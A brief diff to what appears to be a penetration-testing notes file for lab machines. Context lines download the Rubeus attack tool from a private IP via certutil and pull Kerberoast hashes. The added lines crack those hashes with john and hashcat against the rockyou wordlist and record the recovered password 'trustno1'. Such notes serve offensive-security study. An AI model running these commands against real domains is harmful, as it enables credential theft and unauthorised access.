@@ -973,8 +973,11 @@ certutil -urlcache -split -f http://192.168.45.192/Rubeus.exe
 # Ctrl + D
 download ./kerberoast.hashes
 
-# crack
+# crack - trustno1
+john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
 
+# 
 ```
 
 ### Resourced
